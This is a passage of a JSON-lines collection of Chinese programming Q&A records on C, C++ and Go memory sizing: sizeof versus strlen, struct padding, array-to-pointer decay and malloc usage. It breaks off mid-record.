{"Answer": "&lt;p&gt;sizeof计算的是内存大小&amp;#xff0c;sozeof得到的一般是固定值&amp;#xff0c;strlen计算的是字符串长度&amp;#xff0c;字符串的长度从地址开始一直到\\0结束。&lt;br /&gt;char a[]&amp;#61;&amp;#34;abc&amp;#34;;&lt;br /&gt;这么定义以后&amp;#xff0c;数组a的大小就是4&amp;#xff0c;是固定不变的&amp;#xff0c;&amp;#xff08;最后隐含了一个\\0字符)&amp;#xff0c;所以sizeof(a)的大小永远是4.&lt;br /&gt;执行strcat函数后&amp;#xff0c;strcat将字符数组b中内容拼接到a后面&amp;#xff0c;strcat自动在拼接后的字符串末尾添加\\0&amp;#xff0c;所以当使用strlen计算a的长度时&amp;#xff0c;得到的是7&amp;#xff08;不含\\0字符&amp;#xff09;。&lt;br /&gt;代码这么写其实是错误的&amp;#xff0c;字符拼接后超出了a的内存大小&amp;#xff0c;会导致内存异常。strcat函数没有做内存检查机制&amp;#xff0c;只是要求在输入参数时&amp;#xff0c;a必须要有足够的内存空间&amp;#xff0c;所以程序能运行出结果&amp;#xff0c;但是这样是很危险的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["strcat 前后 字符串执行sizeof 显示长度没有变化但是用strlen 就是实际字符串拼接后的长度", ["\n[root@kanq c]# ./a.out\nbefore ", "sizeof", " is ", "4", "\nbefore strlen is ", "3", "\nbehind ", "sizeof", " is ", "4", "\nbefore ", "sizeof", " is ", "7", "\n[root@kanq c]", "# cat b.c", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<string.h>", "\n", "void", " ", "main", "()", "{\n", "char", " a[]=", "\"abc\"", ";\n", "char", " b[]=", "\"1234\"", ";\n", "printf", "(", "\"before sizeof is %d \\n\"", ",", "sizeof", "(a));\n", "printf", "(", "\"before strlen is %d \\n\"", ",", "strlen", "(a));\n\n", "strcat", "(a,b);\n", "printf", "(", "\"behind sizeof is %d \\n\"", ",", "sizeof", "(a));\n", "printf", "(", "\"behind strlen is %d \\n\"", ",", "strlen", "(a));\n\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen就是你实际字符串的长度,扫描到&amp;#39;\\0&amp;#39;(在字符串结尾隐藏的加入)就结束了,所以是4,但是你申请的字符数组长度为8,每个char一字节,所以sizeof返回8字节&lt;br /&gt;&lt;strong&gt;有帮助望采纳~&lt;/strong&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["中专c语言选择题，考点strlen和sizeof函数的用法。", ["就strlen函数和sizeof函数的区别我一直分不太清，", "strlen是计算某字符串中的字符数，也包括字符数组，", "sizeof是在已知字符串或字符数组的前提下再加上单个字符null，或'＼0'，", "但是在字符数组中该如何计算，", "题目如下，"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第一个括号相当于强制类型转化&amp;#xff0c;比如你要的是int指针&amp;#xff0c;第一个括号就可以放&amp;#xff08;int *&amp;#xff09;&amp;#xff0c;这样结果就是int型指针。&lt;br /&gt;第二个括号指的是你要申请什么类型的空间&amp;#xff0c;sizeof函数是返回数据类型的内存空间的。&lt;br /&gt;比如&amp;#xff0c;我要申请一个指针&amp;#xff0c;占用四个int大小&amp;#xff0c;就可以这样写&amp;#xff1a;(int *)malloc (sizeof(int) * 4)&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["（）malloc（sizeof（））两个括号分别放什么", ["最近学习数据结构，这个初始化操作。", "为什么函数前面也能放括号？印象中只能是函数后面跟啊"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;This is because of padding added to satisfy alignment constraints. &lt;a href=\"http://en.wikipedia.org/wiki/Data_structure_alignment\" rel=\"noreferrer\"&gt;Data structure alignment&lt;/a&gt; impacts both performance and correctness of programs:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Mis-aligned access might be a hard error (often &lt;code&gt;SIGBUS&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Mis-aligned access might be a soft error.\n\n&lt;ul&gt;\n&lt;li&gt;Either corrected in hardware, for a modest performance-degradation.&lt;/li&gt;\n&lt;li&gt;Or corrected by emulation in software, for a severe performance-degradation.&lt;/li&gt;\n&lt;li&gt;In addition, atomicity and other concurrency-guarantees might be broken, leading to subtle errors.&lt;/li&gt;\n&lt;/ul&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Here's an example using typical settings for an x86 processor (all used 32 and 64 bit modes):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;struct X\n{\n    short s; /* 2 bytes */\n             /* 2 padding bytes */\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 3 padding bytes */\n};\n\nstruct Y\n{\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n    short s; /* 2 bytes */\n};\n\nstruct Z\n{\n    int   i; /* 4 bytes */\n    short s; /* 2 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n};\n\nconst int sizeX = sizeof(struct X); /* = 12 */\nconst int sizeY = sizeof(struct Y); /* = 8 */\nconst int sizeZ = sizeof(struct Z); /* = 8 */\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;One can minimize the size of structures by sorting members by alignment (sorting by size suffices for that in basic types) (like structure &lt;code&gt;Z&lt;/code&gt; in the example above).&lt;/p&gt;\n\n&lt;p&gt;IMPORTANT NOTE: Both the C and C++ standards state that structure alignment is implementation-defined.  Therefore each compiler may choose to align data differently, resulting in different and incompatible data layouts.  For this reason, when dealing with libraries that will be used by different compilers, it is important to understand how the compilers align data.  Some compilers have command-line settings and/or special &lt;code&gt;#pragma&lt;/code&gt; statements to change the structure alignment settings.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么结构体的 sizeof 不等于每个成员 sizeof 的总和？", ["\n\n", "Why does the ", "sizeof", " operator return a size larger for a structure than the total sizes of the structure's members?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组名作为函数的形参传递&amp;#xff0c;它在函数里退化为指针&amp;#xff0c;所以你在函数里sizeof()得到的值是指针的大小。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["数组与函数传入问题，为啥sum函数里的sizeof（A）和main里的sizeof（A）不同", ["\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n\n", "int", " ", "sumofelements", "(", "int", " A[])", "\n", "{\n    ", "printf", "(", "\"sum(A)=%d\\n\"", ",", "sizeof", "(A));\n    ", "printf", "(", "\"sum(A[0])=%d\\n\"", ",", "sizeof", "(A[", "0", "]));\n    ", "for", "(", "int", " i=", "0", "; i<", "5", "; i++)\n        ", "printf", "(", "\"%d\\n\"", ",A[i]);\n}\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " A[]={", "1", ",", "2", ",", "3", ",", "4", ",", "5", "};\n    ", "sumofelements", "(A);\n    ", "printf", "(", "\"main(A)=%d\\n\"", ",", "sizeof", "(A));\n    ", "printf", "(", "\"main(A[0])=%d\\n\"", ",", "sizeof", "(A[", "0", "]));\n\n    ", "return", " ", "0", ";\n}\n\n", "\n"]], "Tag": "程序设计"}
{"Answer": "Java 自带了 instanceof 方法，直接用就可以了。\r\n其他几个的用 getClass 可以获取对象的类型信息的。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Java语言里怎么实现sizeof idof typeof methodof 和 instanceof 这几个方法呢", ["Java语言里怎么实现sizeof idof typeof methodof 和 instanceof 这几个方法呢"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;length()函数离&amp;#xff0c;a1代表数组首元素的地址&amp;#xff0c;64位下 sizeof(a1)&amp;#61;8&amp;#xff0c;a1[0]是int类型&amp;#xff0c;sizeof(a1[0])&amp;#61;4&amp;#xff0c;所以返回2。&lt;br /&gt;没必要这么麻烦&amp;#xff0c;可以在main函数里直接获取&amp;#xff1a;sizeof(A)/sizeof(A[0]);或者使用宏定义&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/408768954556139.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++函数运行结果不对", ["写了个简单的函数 结果咋不对呢？", "\n", "问题相关代码，请勿粘贴截图", "\n", "#", "include", "<iostream>", "\n", "using", " ", "namespace", " std;\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " A[] = { ", "1", ",", "3", ",", "4", ",", "9", ",", "2", ",", "5", ",", "6", ",", "45", ",", "23", " };\n    ", "int", " ", "length", "(", "int", " a[])", ";\n    cout << ", "length", "(A) << endl;", "//运行结果是2（不知道哪里的问题）", "\n    \n    ", "system", "(", "\"pause\"", ");\n    ", "return", " ", "0", ";\n}\n\n", "int", " ", "length", "(", "int", " a1[])", "\n", "{\n    ", "return", " ", "sizeof", "(a1)/", "sizeof", "(a1[", "0", "]); ", "//警告C6384    用另一个值除指针的sizeof值", "\n\n}\n", "\n", "运行结果及报错内容", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "ansi c规定，sizeof(char) = 1。因此，符合标准的C编译器，两者结果一样。但是也不排除有那么一些另类的编译器有什么不同。但是我没见过。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于malloc(sizeof(char)*(strlen(pDepartment)+1))", ["malloc(sizeof(char)*(strlen(pDepartment)+1))  这句 写成“：", "\nmalloc(strlen(pDepartment)+1))   不就好了， 干嘛要用sizeof  呢  ，看着费解。", "\n我这样做正确吗？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组函数fun参数“ x”上的“ sizeof”将返回“ int *”的大小,在64位机器上一个int指针占8个字节&amp;#xff0c;在32位机器上占4个字节。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++ 数组内存问题", ["有说明语句：int a[10];", "\n\n", "及函数：int fun(int x[10], int n) { return sizeof(x); }", "\n\n", "则语句 cout<<fun(a,10)<<endl; 的显示结果是（ ）。", "\n\n", " ", "\n\n", "为什么是4不是40"]], "Tag": "程序设计"}
{"Answer": "首先union u_type这个占用了8个字节\r\n然后struct str_type会按8字节对齐\r\n union u_type u[2];\r\n这个有两个，占了16个字节\r\nchar str[100];\r\n100+16，不能被8整除，系统会自动填充4个字节到120.\r\n这样就可以整除", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一道用 sizeof 求结构体所占大小的笔试题？求教", ["下列程序，为什么输出的结果是 120？", "\n\n", " int main(int argc, char* argv[])\n{\n     union u_type\n     {\n         int i;\n         double x;\n         float f;\n     };\n     struct str_type\n     {\n         char str[100];\n         union u_type u[2];\n     };\n     printf(\"%d\\n\",sizeof(struct str_type));\n}\n"]], "Tag": "程序设计"}
{"Answer": "Node P                                              ---这个定义 的节点对象实例\r\n和 为变量 ANode Q                              ---这个定义了一个指向对象实例的指针\r\n创建空间\r\nP=（Node *）malloc（sizeof（Node））；            所以不能讲指针赋值给一个对象\r\n和 Q=(ANode)malloc（sizeof（ANode））；         定义有错，将4字节的内存强制转换为node指针，极其容易内存越界啊。\r\n\r\n正确用法是ANode   Q=（ANode）malloc（sizeof（Node））；", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于内存分配的问题   ", ["关于内存分配，结构体定义式多定义了一个指针的情况", "\ntypedef struct node{ ", "\n    int a; ", "\n     int b;", "\n}Node, *ANode;", "\n那么为变量", "\nNode P ", "\n和 为变量 ANode Q", "\n创建空间", "\nP=（Node *）malloc（sizeof（Node））；", "\n和 Q=(ANode)malloc（sizeof（ANode））；", "\n区别在哪里"]], "Tag": "程序设计"}
{"Answer": "对链表没什么影响，可是他还是会占着内存啊，用的多了就会内存溢出啊，", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c数据结构单链表的操作", ["Status ListDelete(LinkList *L,int i,ElmeType *e)", "\n{", "\n    int j;", "\n    LinkList p;", "\n\n", "p = *L;\nj = 1;\nwhile(p&&j<i)\n{\n    p = p->next;//p为第i个位置的next元素；\n    j++;\n}\nif(!p&&j>i-1) return ERROR;\nq = p->next;\nfree(q);   \np->next = p->next->next;//使p为第i+1位置的next元素；\n\nreturn OK;\n", "\n\n", "}", "\n你们p既然已经为i+1的next，那为什么要释放第i个节点的内存空间，可以不用free释放节点吗？我感觉不释放的话对链表没有影响啊。", "\n类似的增加新节点用malloc（sizeof（Node））可以不用malloc吗？他可以自动开辟一块内存空间吗？讲的详细点谢谢。"]], "Tag": "程序设计"}
{"Answer": "sizeof(\"\\0\")=2\r\nsizeof是编译器在编译时计算，计算括号中内容的大小，注意，这和地址没关系，因为这发生在编译期\r\n那么\"\\0\"是多大呢？\\0是1个字符，再加上一个字符结束符（也是\\0)，共2个。\r\n如果有疑问的话，自己试一下sizeof(\"a\"),sizeof(\"\\0a\")等就明白了，从这里可以发现，字符串中间是可以有\\0的。\r\nstrlen(\"\\0\")=0\r\n这个只要知道strlen是怎么计算字符串长度的就可以很容易得出答案了，该\"\\0\"大小为2，且两个都是\\0，遇到第一个\\0就结束了，所以是0", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言sizeof(\"\\0\") strlen(\"\\0\") ", ["在32位编译系统中，字符型变量占1个字节，则sizeof(\"\\0\") 、strlen(\"\\0\")分别为（）A.1  2  B.2  1 C.2  0  D. 2  2", "\n 求大侠详细解释"]], "Tag": "程序设计"}
{"Answer": "&lt;ul&gt;&lt;li&gt;可以查看手册&amp;#xff1a;&lt;a href=\"https://zh.cppreference.com/w/c/language/initialization\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;font size=\"3\"&gt;c语言-初始化&lt;/font&gt;&lt;/a&gt; 中的内容&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这里使用未初始化的内存是什么意思啊，怎么改啊", ["void Josephu(LNode*& L, int n,int s,int m) //n个人，从s开始，数到m出列", "{", "\n", "LNode* p = L;\nLNode* q;\n", "//q = (LNode*)malloc(sizeof(LNode));", "\n    ", "for", " (int i = ", "1", "; i <= n; i++)\n    {\n        \n        ", "if", " (p->", "data", " == s)\n            break;\n        ", "p", " = p->", "next;   ", "//找出s的位置，并用p记录", "\n    }\n\n    printf(", "\"依次出列的顺序为：\\n\"", ");\n    ", "for", " (int i = ", "0", "; i < n; i++) ", "//n次出列", "\n    {\n        \n        int j = ", "1", ";\n        ", "while", " (j < m)\n        {\n            ", "p", " = p->", "next; ", "//依次报数，当j=m时，结束循环，找到相应的p结点", "\n            j++;\n\n        }\n\n       ", "printf", "(\"%d \", p->", "data", ");\n    \n        ", "//将当前数据域输出，并修改当前数据域为下一结点的数据域,并修改当前的数据域为下一结点的数据域，", "\n        ", "//同时指向下一结点的下一结点，用来删除当前结点", "\n        ", "q", " = p->", "next; ", "//用q保存p的下一结点", "\n        ", "p", "->", "data", " = p->", "next", "->", "data", ";", "//p的数据域改为下一结点的数据域", "\n        ", "p", "->", "next", " = p->", "next", "->", "next;", "//指向下一结点", "\n        free( q);\n\n    }\n}\n", "\n", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "首先，m_pBuffer应该是个成员指针变量，不是数组名吧。sizeof 运算符对“指针变量”运算的结果是指针变量的字节大小(32位4字节，64位8字节)，可不是其指向的数据的大小哦。\r\n对数组名运算是为数组分配的空间的字节大小。\r\n其次，这个警告：**-Wsizeof-pointer-memaccess**\r\n\r\nWarn for suspicious length parameters to certain string and memory built-in functions if the argument uses sizeof.\r\nThis warning warns e.g. about memset (ptr, 0, sizeof (ptr)); if ptr is not an array, but a pointer, and suggests a possible fix, or about memcpy (&amp;foo, ptr, sizeof (&amp;foo));. This warning is enabled by -Wall.\r\ngcc编译器检测到可疑的使用sizeof对指针做了运算而不是数组，所以给了个温馨提示哦。\r\n\r\n\r\n**怎么解决：**\r\n对指针指向的数据做sizeof，如果是new分配的还要乘上数量了。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["下面的代码中警告是什么原因，怎么解决", ["memset(m_pBuffer,0,sizeof(m_pBuffer));", "\n\n", "warning: argument to 'sizeof' in 'void* memset(void*, int, size_t)' call is the same expression as the destination; did you mean to provide an explicit length? [-Wsizeof-pointer-memaccess]", "\n     memset(m_pBuffer,0,sizeof(m_pBuffer));", "\n                              ^"]], "Tag": "程序设计"}
{"Answer": "sizeof(int)的返回类型：SIZE_T，SIZE_T是标准C库中定义的，应为unsigned int，在64位系统中为 long unsigned int。int默认为有符号型。当有符号型减去无符号型时有符号型会强制转换为无符号型，其结果也是无符号型，必然大于等于0，所以会是死循环。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["计算机系统的考题，为什么这个是死循环", ["#include <stdio.h>\n#define DELTA sizeof(int)\nint main()\n{\n    int i;\n    for(i=40;i-DELTA>=0;i-=DELTA)\n        printf(\"%d\",i);\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;typedef struct Node\n{\n\tchar data;\n\tstruct\tNode*next;\n}Node,*LinkList;&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Node&amp;#xff1a;可以使用他定义结构体&amp;#xff1b;&lt;/p&gt;\n\n&lt;p&gt;Node *&amp;#xff1a;可以使用他定义结构体指针&amp;#xff1b;&lt;/p&gt;\n\n&lt;p&gt;LinkList&amp;#xff1a;可以是用他定义结构体指针&amp;#xff1b;&lt;/p&gt;\n\n&lt;p&gt;因为定义是指定*LinkList时指针类型了&amp;#xff0c;相当于宏定义一样。所以使用LinkList就是LinkList *&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["*L=(LinkList)malloc(sizeof(Node));难道没把l初始化吗？", ["\n", "#include<stdio.h>\n#include<stdlib.h>\ntypedef struct Node\n{\n\tchar data;\n\tstruct\tNode*next;\n}Node,*LinkList;\nvoid InitList(LinkList *L){\n\t//实参就是void InitList(L)\n\t*L=(LinkList)malloc(sizeof(Node));\n\t(*L)->next=NULL;\n}//L是指向头结点的指针，用来接收头指针；*L头结点；\nvoid creatfromhead(LinkList L){\n\tchar c;\n\tNode *s;\n\tc=getchar();\n\twhile (c!='/n')\n\t{\n\t\ts=(Node*)malloc(sizeof(Node));//为什么不是\ts=(Node)malloc(sizeof(Node));？\n\t\ts->data=c;\n\t\tL=s;\n\t\ts->next=L->next;\n\t\tputchar(c);\n\t\tc=getchar();\n\n\t}\n\n}\nvoid main(){\n\tLinkList *l;\n\t\n\tInitList(l);\n\tcreatfromhead(*l);\n\n}", "\n\n", "*LinkList可以被认为是一种指向Node的指针吗？那声明l的时候为什么不是*LinkList l；？", "\n\n", " ", "\n\n", " "]], "Tag": "程序设计"}
{"Answer": "你分配的内存不够，字符串需要的大小是长度+1，因为还有一个结束符也需要1个元素。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["急！！！！！！！！！！！C++中关于strcat（）函数占用其他变量内存地址的问题？", ["源代码有点长，我就只贴关键部分了！", "\n\n", " int main(){\n\n   /省略部分代码。。。。/\n    LinearList *L=(LinearList *)malloc(sizeof(LinearList));\n    InitList(L,MAX);\n    while(1){\n    printf(\"Input file:\");\n    gets(filename);    //用get函数,避免scanf以空格分割数据,\n    if (filename[0]==34) filename[strlen(filename)-1]=0,strcpy(filename,filename+1);  //支持文件拖曳,但会多出双引号,这里是处理多余的双引号\n    if (!strcmp(filename,\"exit\")) exit(0);  //输入exit退出\n    if (!(fp=fopen(filename,\"rb\"))) {printf(\"Can not open this file!\\n\");continue;}  //以二进制打开文件\n    fseek(fp, 0, SEEK_END);  //文件指针转到文件末尾\n    if((len=ftell(fp))==-1) {printf(\"Sorry! Can not calculate files which larger than 2 GB!\\n\");fclose(fp);continue;}  //ftell函数返回long,最大为2GB,超出返回-1\n    rewind(fp);  //文件指针复位到文件头\n    A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476; //初始化链接变量\n    flen[1]=len/0x20000000;     //flen单位是bit\n    flen[0]=(len%0x20000000)*8;\n    memset(x,0,64);   //初始化x数组为0\n    fread(&x,4,16,fp);  //以4字节为一组,读取16组数据\n    for(i=0;i<len/64;i++){    //循环运算直至文件结束\n      md5();\n      memset(x,0,64);\n      fread(&x,4,16,fp);\n    }\n    ((char*)x)[len%64]=128;  //文件结束补1,补0操作,128二进制即10000000\n    if(len%64>55) md5(),memset(x,0,64);\n    memcpy(x+14,flen,8);    //文件末尾加入原文件的bit长度\n    md5();\n    fclose(fp);\n\n    char str1[8];\n    sprintf(str1,\"%08x\",PP(A));\n    char *s1=str1;\n    char str2[8];\n    sprintf(str2,\"%08x\",PP(B));\n    char *s2=str2;\n    char str3[8];\n    sprintf(str3,\"%08x\",PP(C));\n    char *s3=str3;\n    char str4[8];\n    sprintf(str4,\"%08x\",PP(D));\n    char *s4=str4;\n    strcat(str1,str2);\n    strcat(str1,str3);\n    strcat(str1,str4);\n    cout<<str1<<endl;\n    char *p=str1;\n    node x(p,filename);\n    InsertElem(L,x);\n  }\n    Printout(L);\n    return 0;\n}\n", "\n\n", "然后问题是这样的：", "\n通过调试发现：我在while循环外面定义和初始化了变量L之后，L的相关成员变量都有了内存地址。结果当运行完strcat(str1,str2)之后，奇怪的是L变量的内存地址突然变了，导致它所有的成员变量都没有有效内存地址。接下来，任何需要传入L作为参数的函数都没有办法运行，报错。", "\n请问：这是怎么一回事啊？？？解决办法是？？？？或者我通过其他方法把str1、str2、str3连接起来？？？？"]], "Tag": "程序设计"}
{"Answer": "选③8", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["若有如下定义，则 printf（“%d\\n”， sizeof（them））；的输出是", ["若有如下定义，则 printf（“%d\\n”， sizeof（them））；的输出是（ ） ", "\ntypedef union { long x[2]；int y[4]；char z[8]；} MYTYPE；MYTYPE them；", "\n\n", "①32 ②16 ③8 ④24 "]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;h2&gt;1. Struct sizes&lt;/h2&gt;\n\n&lt;p&gt;&lt;strong&gt;TL;DR; (Summary):&lt;/strong&gt; Different implicit padding will be used if you reorder the fields, and the implicit padding counts towards the size of the &lt;code&gt;struct&lt;/code&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Note that the result depends on the target architecture; results you posted applies when &lt;code&gt;GOARCH=386&lt;/code&gt;, but when &lt;code&gt;GOARCH=amd64&lt;/code&gt;, sizes of both &lt;code&gt;A{}&lt;/code&gt; and &lt;code&gt;B{}&lt;/code&gt; will be 24 bytes.&lt;/em&gt;&lt;/p&gt;\n\n&lt;p&gt;Address of fields of a struct must be aligned, and the address of fields of type &lt;code&gt;int64&lt;/code&gt; must be a multiple of 8 bytes. &lt;a href=\"https://golang.org/ref/spec#Package_unsafe\" rel=\"nofollow noreferrer\"&gt;Spec: Package &lt;code&gt;unsafe&lt;/code&gt;:&lt;/a&gt;&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;Computer architectures may require memory addresses to be &lt;em&gt;aligned&lt;/em&gt;; that is, for addresses of a variable to be a multiple of a factor, the variable's type's &lt;em&gt;alignment&lt;/em&gt;. The function &lt;code&gt;Alignof&lt;/code&gt; takes an expression denoting a variable of any type and returns the alignment of the (type of the) variable in bytes.&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;Align of &lt;code&gt;int64&lt;/code&gt; is 8 bytes:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;fmt.Println(unsafe.Alignof((int64(0)))) // Prints 8\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;So in case of &lt;code&gt;A&lt;/code&gt; since first field is &lt;code&gt;bool&lt;/code&gt;, there is a 7-byte implicit padding after &lt;code&gt;A.a&lt;/code&gt; so that &lt;code&gt;A.b&lt;/code&gt; which is of type &lt;code&gt;int64&lt;/code&gt; can start on an address that is a multiple of 8. This (that 7-byte padding is needed exactly) is guaranteed as the &lt;code&gt;struct&lt;/code&gt; itself is aligned to an address which is a multiple of 8, because that is the largest size of all of its fields. See: &lt;a href=\"https://golang.org/ref/spec#Size_and_alignment_guarantees\" rel=\"nofollow noreferrer\"&gt;Spec: Size alignment guarantees:&lt;/a&gt;&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;For a variable &lt;code&gt;x&lt;/code&gt; of struct type: &lt;code&gt;unsafe.Alignof(x)&lt;/code&gt; is the largest of all the values &lt;code&gt;unsafe.Alignof(x.f)&lt;/code&gt; for each field &lt;code&gt;f&lt;/code&gt; of &lt;code&gt;x&lt;/code&gt;, but at least &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;In case of &lt;code&gt;B&lt;/code&gt; (and if &lt;code&gt;GOARCH=386&lt;/code&gt; which is your case) there will only be a 3-byte implicit padding after the &lt;code&gt;B.a&lt;/code&gt; field of type &lt;code&gt;bool&lt;/code&gt; because this field is followed by a field of type &lt;code&gt;int&lt;/code&gt; (which has size of 4 bytes) and not &lt;code&gt;int64&lt;/code&gt;.&lt;/p&gt;\n\n&lt;p&gt;Align of &lt;code&gt;int&lt;/code&gt; is 4 bytes if &lt;code&gt;GOARCH=386&lt;/code&gt;, and 8 bytes if &lt;code&gt;GOARCH=amd64&lt;/code&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;fmt.Println(unsafe.Alignof((int(0))))   // Prints 4 if GOARCH=386, and 8 if GOARCH=amd64\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Use &lt;a href=\"https://golang.org/pkg/unsafe/#Offsetof\" rel=\"nofollow noreferrer\"&gt;&lt;code&gt;unsafe.Offsetof()&lt;/code&gt;&lt;/a&gt; to find out the offsets of fields:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;// output 24\na := A{}\nfmt.Println(unsafe.Sizeof(a),\n    unsafe.Offsetof(a.a), unsafe.Offsetof(a.b), unsafe.Offsetof(a.c))\n\n// output 16\nb := B{}\nfmt.Println(unsafe.Sizeof(b),\n    unsafe.Offsetof(b.b), unsafe.Offsetof(b.a), unsafe.Offsetof(b.c))\n\n// output 0\nfmt.Println(unsafe.Sizeof(C{}))\n\nvar i int\nfmt.Println(unsafe.Sizeof(i))\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output if &lt;code&gt;GOARCH=386&lt;/code&gt; (try it on the &lt;a href=\"http://play.golang.org/p/JovERjbY0V\" rel=\"nofollow noreferrer\"&gt;Go Playground&lt;/a&gt;):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;24 0 8 16\n16 0 8 12\n0\n4\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output if &lt;code&gt;GOARCH=amd64&lt;/code&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;24 0 8 16\n24 0 8 16\n0\n8\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;h2&gt;2. Zero size values&lt;/h2&gt;\n\n&lt;p&gt;&lt;a href=\"https://golang.org/ref/spec#Size_and_alignment_guarantees\" rel=\"nofollow noreferrer\"&gt;Spec: Size alignment guarantees:&lt;/a&gt;&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;A struct or array type has size zero if it contains no fields (or elements, respectively) that have a size greater than zero. &lt;strong&gt;Two distinct zero-size variables may have the same address in memory.&lt;/strong&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;So the spec just gives a hint to use the same memory address but it's not a requirement. But current implementations follow it. That is, no memory will be allocated for values of types having a size of zero, this includes the empty struct &lt;code&gt;struct{}&lt;/code&gt; and arrays of zero length, e.g. &lt;code&gt;[0]int&lt;/code&gt;, or arrays whose elements has a size of zero (and with arbitrary length).&lt;/p&gt;\n\n&lt;p&gt;See this example:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;a := struct{}{}\nb := struct{}{}\nc := [0]int{}\nd := [3]struct{}{}\n\nfmt.Printf(\"%p %p %p %p %p\", &amp;amp;a, &amp;amp;b, &amp;amp;c, &amp;amp;d, &amp;amp;d[2])\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output (try it on the &lt;a href=\"http://play.golang.org/p/lv87mVaKuL\" rel=\"nofollow noreferrer\"&gt;Go Playground&lt;/a&gt;): All the addresses are the same.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;0x21cd7c 0x21cd7c 0x21cd7c 0x21cd7c 0x21cd7c\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;For an interesting and related topic, read: &lt;a href=\"http://dave.cheney.net/2015/10/09/padding-is-hard\" rel=\"nofollow noreferrer\"&gt;&lt;strong&gt;Dave Cheney: Padding is hard&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如果字段顺序不同，结构的大小也将不同", ["\n\n", "package main\n\nimport (\n    \"fmt\"\n    \"unsafe\"\n)\n\ntype A struct {\n    a bool\n    b int64\n    c int\n}\n\ntype B struct {\n    b int64\n    a bool\n    c int\n}\n\ntype C struct {\n}\n\nfunc main() {\n    // output 